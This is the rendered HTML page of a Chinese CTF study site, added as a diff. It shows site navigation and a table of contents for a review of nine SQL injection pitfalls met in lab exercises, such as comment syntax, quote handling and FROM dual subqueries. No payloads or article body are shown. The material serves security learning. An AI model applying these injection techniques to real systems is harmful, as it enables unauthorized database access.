@@ -1,0 +1,6438 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Web 安全知识点整理 + 靶场 Writeup">
+      
+      
+        <meta name="author" content="guang">
+      
+      
+        <link rel="canonical" href="https://guang12-c.github.io/ctf-notes/knowledge/sql/03-%E5%8D%A1%E7%82%B9%E5%A4%8D%E7%9B%98/">
+      
+      
+        <link rel="prev" href="../02-payload%E9%80%9F%E6%9F%A5/">
+      
+      
+        <link rel="next" href="../04-%E5%9B%9B%E4%B8%AAlab%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>卡点复盘 - guang's CTF Notes</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CJetBrains+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"JetBrains Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/css/bg-video.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#sql" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../.." title="guang&#39;s CTF Notes" class="md-header__button md-logo" aria-label="guang's CTF Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            guang's CTF Notes
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              卡点复盘
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/guang12-c/ctf-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    guang12-c/ctf-notes
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  首页
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  知识点
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../blog/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  WP 博客
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../files/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  工具字典
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../.." title="guang&#39;s CTF Notes" class="md-nav__button md-logo" aria-label="guang's CTF Notes" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 9a3 3 0 0 1 3 3 3 3 0 0 1-3 3 3 3 0 0 1-3-3 3 3 0 0 1 3-3m5.86 10.31C16.23 21.22 14.28 22.45 12 23c-2.56-.61-4.7-2.07-6.42-4.37C3.86 16.34 3 13.8 3 11V5l9-4 9 4v6c0 2.39-.64 4.61-1.92 6.67l-2.91-2.91c.52-.79.83-1.76.83-2.76a5 5 0 0 0-5-5 5 5 0 0 0-5 5 5 5 0 0 0 5 5c1 0 1.97-.31 2.76-.83z"/></svg>
+
+    </a>
+    guang's CTF Notes
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/guang12-c/ctf-notes" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    guang12-c/ctf-notes
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    首页
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    知识点
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    知识点
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+          
+          
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2" checked>
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL 注入
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2_2" id="__nav_2_2_label" tabindex="">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_2_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    SQL 注入
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../01-%E5%8E%9F%E7%90%86%E4%B8%8E%E8%AF%86%E5%88%AB/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    原理与识别
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../02-payload%E9%80%9F%E6%9F%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    payload 速查
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    卡点复盘
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    卡点复盘
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-302" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 1：把 302 当成「失败了」
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 1：把 302 当成「失败了」">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 2：用了全角中文逗号 ，
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 2：用了全角中文逗号 ，">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 3：不理解 ' 到底在干什么
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 3：不理解 &#39; 到底在干什么">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_9" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 4：payload 结尾加了 ;
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 4：payload 结尾加了 ;">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 5：-- 后面没空格 / 忘了加注释
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 5：-- 后面没空格 / 忘了加注释">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-z" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 6：用 &gt;'z' 做测试
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 6：用 &gt;&#39;z&#39; 做测试">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7from-dual-users" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 7：FROM dual 里引用 users 的列
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 7：FROM dual 里引用 users 的列">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_19" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 8：括号不配对
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 8：括号不配对">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_23" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        原因
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_24" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        正确做法
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9else-a" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        坑 9：else a' 少了开引号
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="坑 9：else a&#39; 少了开引号">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_25" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        现象
+      
+    </span>
